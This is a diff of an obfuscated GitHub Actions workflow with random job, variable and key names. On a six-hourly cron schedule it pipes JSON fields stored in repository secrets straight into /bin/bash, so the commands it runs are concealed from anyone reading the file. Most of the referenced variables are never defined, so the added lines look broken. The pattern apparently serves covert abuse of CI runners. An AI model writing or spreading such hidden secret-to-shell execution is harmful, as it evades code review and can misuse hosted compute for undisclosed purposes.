@@ -1,24 +1,31 @@
 name: dongxinchang5647
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '14 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongxinchang5647
         env:
-          g9344: ${{ secrets.g9344 }}
+          te395: ${{ secrets.te395 }}
         run: |
-          echo $g9344 | jq -r .yuqs6340 | /bin/bash
-          echo $f2412 | jq -r .kb7 | /bin/bash
-          echo $bwdrx0 | jq -r .nvxl0 | /bin/bash
-          echo $x9 | jq -r .chd9662 | /bin/bash
-          echo $ub44369 | jq -r .qwei9 | /bin/bash
-          echo $d1663 | jq -r .scc35 | /bin/bash
+          echo $te395 | jq -r .m4167 | /bin/bash
+          echo $vfff6 | jq -r .qkuf1996 | /bin/bash
+          echo $wltll5 | jq -r .hzyl2 | /bin/bash
+          echo $m50 | jq -r .jw3604 | /bin/bash
+          echo $lwr14956 | jq -r .swja439 | /bin/bash
+          echo $svznc048 | jq -r .nxgtc12416 | /bin/bash
+          echo $fjrdg3099 | jq -r .nlqr342 | /bin/bash
+          echo $hagi30 | jq -r .b4 | /bin/bash
+          echo $ndlmb47867 | jq -r .uo90596 | /bin/bash
+          echo $md21 | jq -r .wg5369 | /bin/bash
+          echo $ygcoo333 | jq -r .wkjuk29 | /bin/bash
+          echo $swn571 | jq -r .zb4249 | /bin/bash
+          echo $y545 | jq -r .fgff14 | /bin/bash
+          echo $yn6 | jq -r .bi755 | /bin/bash
+          echo $uvitb68251 | jq -r .uhv5 | /bin/bash
 
